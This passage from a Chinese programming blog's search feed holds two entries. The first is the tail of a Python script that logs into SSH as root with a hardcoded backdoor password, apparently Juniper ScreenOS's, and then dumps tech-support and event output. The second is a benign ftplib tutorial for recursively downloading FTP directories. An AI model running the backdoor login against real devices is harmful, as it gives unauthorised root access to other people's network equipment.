class="number">20</span>)</span><br><span class="line">        data = readUntilTimeout()</span><br><span class="line">        ret = data</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'-&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="number">-10</span>:]) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            data = readUntilTimeout()</span><br><span class="line">            ret += data</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ssh.send(<span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    ssh = pxssh.pxssh(timeout=readTimeout)</span><br><span class="line">    ssh.login(</span><br><span class="line">        server=host,</span><br><span class="line">        port=port,</span><br><span class="line">        username=<span class="string">'root'</span>,</span><br><span class="line">        password=<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span>,</span><br><span class="line">        auto_prompt_reset=<span class="keyword">False</span>,</span><br><span class="line">        login_timeout=loginTimeout,</span><br><span class="line">    )</span><br><span class="line">    banner = ssh.before</span><br><span class="line">    ssh.sendline(<span class="string">'?'</span>)</span><br><span class="line">    help = ssh.read_nonblocking(size=<span class="number">65536</span>, timeout=readTimeout)</span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>
<p>代码说明：</p>
<ul>
<li>26行：连续发送多个\n，一次性将服务器端的多个结果分段获取到客户端的接收缓存中，这样可以减少交互，提高程序效率。</li>
<li>29行：判断每次读取的缓存区中的数据的后10个字符串中是否存在 <strong>-&gt;</strong> 字符，来识别最后一个结果分段。</li>
</ul>
<p>代码逻辑与Telnet程序类似。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Python实现下载FTP服务器的整个目录（文件夹）]]></title>
      <url>http://dog.wtf/tech/downloading-ftp-directory-recursively-with-python/</url>
      <content type="html"><![CDATA[<ul>
<li>Title(EN): <em><strong>Downloading FTP Directory Recursively with Python</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h3 id="0x00-需求"><a href="#0x00-需求" class="headerlink" title="0x00 需求"></a>0x00 需求</h3><ul>
<li>快速批量下载多个FTP服务器的上的目录（指定目录或整个目录）。</li>
</ul>
<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><ul>
<li>核心问题：针对一个FTP Server，要能够下载其指定目录。即递归遍历所有目录，针对每个目录中的子目录，创建本地相应目录；针对每个目录中的文件，下载到本地相应目录。</li>
<li>下载所有文件的过程最好也是可并发的，以加快整个下载过程。</li>
</ul>
<h3 id="0x02-前车之轮"><a href="#0x02-前车之轮" class="headerlink" title="0x02 前车之轮"></a>0x02 前车之轮</h3><p>需求及实现思路已经清楚，剩下的就是编码测试了。</p>
<p>按照惯例，为避免重复造轮子，在开工前有必要上谷歌百度一下，确定前人是否已经造出了好用的轮子。<br>找到如下几个：</p>
<ol>
<li><a href="http://www.jb51.net/article/33986.htm" target="_blank" rel="external">通过python下载FTP上的文件夹的实现代码</a></li>
<li><a href="http://canlynet.iteye.com/blog/836996" target="_blank" rel="external">python实现的ftp自动上传下载程序（支持目录递归操作）</a></li>
<li><a href="http://www.jb51.net/article/67196.htm" target="_blank" rel="external">python实现支持目录FTP上传下载文件的方法</a></li>
<li><a href="https://pypi.python.org/pypi/ftputil/3.2" target="_blank" rel="external">python第三方库 ftputil</a></li>
<li><a href="https://pypi.python.org/pypi/pyftpsync/1.0.3" target="_blank" rel="external">python第三方库 pyftpsync</a></li>
</ol>
<p>逐一测试，都不太好用。</p>
<p>1在现实时使用os.chdir切换本地下载目录，批量下载（多线程并发下载多个服务器目录）时会产生目录混乱。</p>
<p>3在下载每个文件都需要执行ls函数确认其存在于远程目录，性能很低。</p>
<p>使用2 4 5没有成功下载过，可能是用法不对，粗略扫了下文档和源码，也没找到正确用法。如果你知道正确用法，还请指点。</p>
<h3 id="0x03-实现"><a href="#0x03-实现" class="headerlink" title="0x03 实现"></a>0x03 实现</h3><p>既然前人的轮子都不太好用，只好再造一个。相对其他协议而言，FTP协议还是比较复杂的，因此最好基于已有的FTP库来实现，python的自带FTP库是ftplib，这里就选用它。</p>
<ul>
<li><a href="https://docs.python.org/2/library/ftplib.html" target="_blank" rel="external">文档</a></li>
<li><a href="https://github.com/python/cpython/blob/2.7/Lib/ftplib.py" target="_blank" rel="external">源码</a></li>
</ul>
<p>大概实现思路及流程已在0x01中指出，这里可能需要用到ftplib中的两个函数</p>
<ul>
<li><strong>ftplib.FTP.dir()</strong> : 用于列举目录信息，其内部实现调用的是FTP协议中的LIST请求，输出格式类似linux下的命令<em><strong>ls -alh</strong></em>。这里需要注意，默认情况下，该函数是不返回目录信息的字符串的，它在内部实现中调用了ftplib.FTP.retrlines()函数得到返回数据的每一行，并默认使用println函数处理每行数据，即打印至标准输出。当然，处理每行数据的函数是可以被替换的，在dir()函数的参数中指出即可。尽管如此还是难以将目录信息存入到一个字符串并返回，以供我们后续调用。在0x02中提到的3是通过是给dir函数传入自定义类的实例函数，并将目录信息存储在自定义类的实例变量中来得到这个值的。当然，也可以通过自定义函数结合全局变量的方式来得到这个值。这种实现略显蹩脚，因此在这里，我们参照原有dir函数的实现方式，在自定义类中实现一个新的dir函数，它不用再传入处理每行数据的函数，且能够返回目录信息。</li>
<li><strong>ftplib.FTP.retrbinary()</strong> : 用于指定并发送某种FTP请求，并以二进制数据接收响应。这里使用它来执行FTP协议中的RETR命令，以下载FTP服务器上指定路径的文件。</li>
</ul>
<a id="more"></a>
<h3 id="0x04-代码"><a href="#0x04-代码" class="headerlink" title="0x04 代码"></a>0x04 代码</h3><p>实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ftplib</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FtpDownloader</span><span class="params">(object)</span>:</span></span><br><span class="line">    PATH_TYPE_UNKNOWN = <span class="number">-1</span></span><br><span class="line">    PATH_TYPE_FILE = <span class="number">0</span></span><br><span class="line">    PATH_TYPE_DIR = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, user=None, passwd=None, port=<span class="number">21</span>, timeout=<span class="number">10</span>)</span>:</span></span><br><span class="line">        self.conn = ftplib.FTP(</span><br><span class="line">            host=host,</span><br><span class="line">            user=user,</span><br><span class="line">            passwd=passwd,</span><br><span class="line">            timeout=timeout</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dir</span><span class="params">(self, *args)</span>:</span></span><br><span class="line">        <span class="string">'''</span><br><span class="line">        by defualt, ftplib.FTP.dir() does not return any value.</span><br><span class="line">        Instead, it prints the dir info to the stdout.</span><br><span class="line">        So we re-implement it in FtpDownloader, which is able to return the dir info.</span><br><span class="line">        '''</span></span><br><span class="line">        info = []</span><br><span class="line">        cmd = <span class="string">'LIST'</span></span><br><span class="line">        <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">            <span class="keyword">if</span> arg:</span><br><span class="line">                cmd = cmd + (<span class="string">' '</span> + arg)</span><br><span class="line">        self.conn.retrlines(cmd, <span class="keyword">lambda</span> x: info.append(x.strip().split()))</span><br><span class="line">        <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(self, rdir=None, init=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span><br><span class="line">        recursively get the tree structure of a directory on FTP Server.</span><br><span class="line">        args:</span><br><span class="line">            rdir - remote direcotry path of the FTP Server.</span><br><span class="line">            init - flag showing whether in a recursion.</span><br><span class="line">        '''</span></span><br><span class="line">        <span class="keyword">if</span> init <span class="keyword">and</span> rdir <span class="keyword">in</span> (<span class="string">'.'</span>, <span class="keyword">None</span>):</span><br><span class="line">            rdir = self.conn.pwd()</span><br><span class="line">        tree = []</span><br><span class="line">        tree.append((rdir, self.PATH_TYPE_DIR))</span><br><span class="line"></span><br><span class="line">        dir_info = self.dir(rdir)</span><br><span class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> dir_info:</span><br><span class="line">            attr = info[<span class="number">0</span>]  <span class="comment"># attribute</span></span><br><span class="line">            name = info[<span class="number">-1</span>]</span><br><span class="line">            path = os.path.join(rdir, name)</span><br><span class="line">            <span class="keyword">if</span> attr.startswith(<span class="string">'-'</span>):</span><br><span class="line">                tree.append((path, self.PATH_TYPE_FILE))</span><br><span class="line">            <span class="keyword">elif</span> attr.startswith(<span class="string">'d'</span>):</span><br><span class="line">                <span class="keyword">if</span> (name == <span class="string">'.'</span> <span class="keyword">or</span> name == <span class="string">'..'</span>):  <span class="comment"># skip . and ..</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                tree.extend(self.tree(rdir=path,init=<span class="keyword">False</span>))  <span class="comment"># recurse</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tree.append(path, self.PATH_TYPE_UNKNOWN)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tree</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">downloadFile</span><span class="params">(self, rfile, lfile)</span>:</span></span><br><span class="line">        <span class="string">'''</span><br><span class="line">        download a file with path %rfile on a FTP Server and save it to locate</span><br><span class="line">        path %lfile.</span><br><span class="line">        '''</span></span><br><span class="line">        ldir = os.path.dirname(lfile)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ldir):</span><br><span class="line">            os.makedirs(ldir)</span><br><span class="line">        f = open(lfile, <span class="string">'wb'</span>)</span><br><span class="line">        self.conn.retrbinary(<span class="string">'RETR %s'</span> % rfile, f.write)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">treeStat</span><span class="params">(self, tree)</span>:</span></span><br><span class="line">        numDir = <span class="number">0</span></span><br><span class="line">        numFile = <span class="number">0</span></span><br><span class="line">        numUnknown = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> path, pathType <span class="keyword">in</span> tree:</span><br><span class="line">            <span class="keyword">if</span> pathType == self.PATH_TYPE_DIR:</span><br><span class="line">                numDir += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_FILE:</span><br><span class="line">                numFile += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_UNKNOWN:</span><br><span class="line">                numUnknown += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> numDir, numFile, numUnknown</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">downloadDir</span><span class="params">(self, rdir=<span class="string">'.'</span>, ldir=<span class="string">'.'</span>, tree=None,</span><br><span class="line">                    errHandleFunc=None, verbose=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span><br><span class="line">        download a direcotry with path %rdir on a FTP Server and save it to</span><br><span class="line">        locate path %ldir.</span><br><span class="line">        args:</span><br><span class="line">            tree - the tree structure return by function FtpDownloader.tree()</span><br><span class="line">            errHandleFunc - error handling function when error happens in</span><br><span class="line">                downloading one file, such as a function that writes a log.</span><br><span class="line">                By default, the error is print to the stdout.</span><br><span class="line">        '''</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> tree:</span><br><span class="line">            tree = self.tree(rdir=rdir, init=<span class="keyword">True</span>)</span><br><span class="line">        numDir, numFile, numUnknown = self.treeStat(tree)</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Host %s tree statistic:'</span> % self.conn.host</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%d directories, %d files, %d unknown type'</span> % (</span><br><span class="line">                numDir,</span><br><span class="line">                numFile,</span><br><span class="line">                numUnknown</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ldir):</span><br><span class="line">            os.makedirs(ldir)</span><br><span class="line">        ldir = os.path.abspath(ldir)</span><br><span class="line"></span><br><span class="line">        numDownOk = <span class="number">0</span></span><br><span class="line">        numDownErr = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> rpath, pathType <span class="keyword">in</span> tree:</span><br><span class="line">            lpath = os.path.join(ldir, rpath.strip(<span class="string">'/'</span>).strip(<span class="string">'\\'</span>))</span><br><span class="line">            <span class="keyword">if</span> pathType == self.PATH_TYPE_DIR:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(lpath):</span><br><span class="line">                    os.makedirs(lpath)</span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_FILE:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.downloadFile(rpath, lpath)</span><br><span class="line">                    numDownOk += <span class="number">1</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                    numDownErr += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> errHandleFunc:</span><br><span class="line">                        errHandleFunc(err, rpath, lpath)</span><br><span class="line">                    <span class="keyword">elif</span> verbose:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'An Error occurred when downloading '</span>\</span><br><span class="line">                              <span class="string">'remote file %s'</span> % rpath</span><br><span class="line">                        traceback.print_exc()</span><br><span class="line">                        <span class="keyword">print</span></span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'Host %s: %d/%d/%d(ok/err/total) files downloaded'</span> % (</span><br><span class="line">                        self.conn.host,</span><br><span class="line">                        numDownOk,</span><br><span class="line">                        numDownErr,</span><br><span class="line">                        numFile</span><br><span class="line">                    )</span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_UNKNOWN:</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'Unknown type romote path got: %s'</span> % rpath</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Host %s directory %s download finished:'</span> % (</span><br><span class="line">                self.conn.host, rdir</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%d directories, %d(%d failed) files, %d unknown type.'</span> % (</span><br><span class="line">                numDir,</span><br><span class="line">                numFile,</span><br><span class="line">                numDownErr,</span><br><span class="line">                numUnknown</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> numDir, numFile, numUnknown, numDownErr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> traceback</span><br><span class="line">    <span class="keyword">from</span> pprint <span class="keyword">import</span> pprint <span class="keyword">as</span> pr</span><br><span class="line"></span><br><span class="line">    flog = open(<span class="string">'err.log'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(host)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fd = FtpDownloader(</span><br><span class="line">                host=host,</span><br><span class="line">                user=<span class="string">'test'</span>,</span><br><span class="line">                passwd=<span class="string">'test'</span>,</span><br><span class="line">                port=<span class="number">21</span>,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            numDir, numFile, numUnknown, numDownErr = fd.downloadDir(</span><br><span class="line">                rdir=<span class="string">'.'</span>,</span><br><span class="line">                ldir=<span class="string">'download'</span>,</span><br><span class="line">                tree=<span class="keyword">None</span>,</span><br><span class="line">                errHandleFunc=<span class="keyword">None</span>,</span><br><span class="line">                verbose=<span class="keyword">True</span></span><br><span class="line">            )</span><br><span class="line">            flog.write(</span><br><span class="line">                <span class="string">'%s\nok\n'</span></span><br><span class="line">                <span class="string">'%d directories, %d(%d failed) files, %d unknown type\n\n\n'</span> % (</span><br><span class="line">                    host,</span><br><span class="line">                    numDir,</span><br><span class="line">                    numFile,</span><br><span class="line">                    numDownErr,</span><br><span class="line">                    numUnknown</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            flog.write(</span><br><span class="line">                <span class="string">'%s\nerror\n%s\n\n\n'</span> % (</span><br><span class="line">                    host,</span><br><span class="line">                    traceback.format_exc()</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    pr(run(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    flog.close()</span><br></pre></td></tr></table></figure>
<p>也可移步至<a href="https://github.com/dog-2/ftpdown" target="_blank" rel="external">github</a>获取代码，欢迎完善。</p>
<p>这里仅抛砖引玉，实现了下载单个FTP的整个目录的核心功能，可以基于该代码继续实现并发下载多个FTP服务器上的指定文件夹的功能。</p>
<p>值得一提的是，这里针对单个FTP服务器上的多个文件下载还是串行的，如想要实现并发下载单个FTP服务器上的多个文件，则可以先通过tree函数得到FTP服务器的目录树，然后再并发下载相应的文件。但并发下载时若多个下载线程共用一个ftplib.FTP类的实例，并调用该实例的retrbinary函数进行下载，则不同线程之间可能会相互影响，具体可以参考ftplib的源码。</p>
<p>当然，要解决这个问题，可以为每个下载线程创建一个独有的ftplib.FTP类的实例，但这样就加大了FTP服务器处理的并发连接数，最大连接数及下载性能还是会受限于FTP服务器，存在不确定性。</p>
<p>我们将实现的程序与Filezilia进行了对比测试，发现它对多个文件的下载过程也是串行了，而最终下载文件的总数及速度二者相近。</p>
]]></content>
    </entry>
    
  
  
</search>
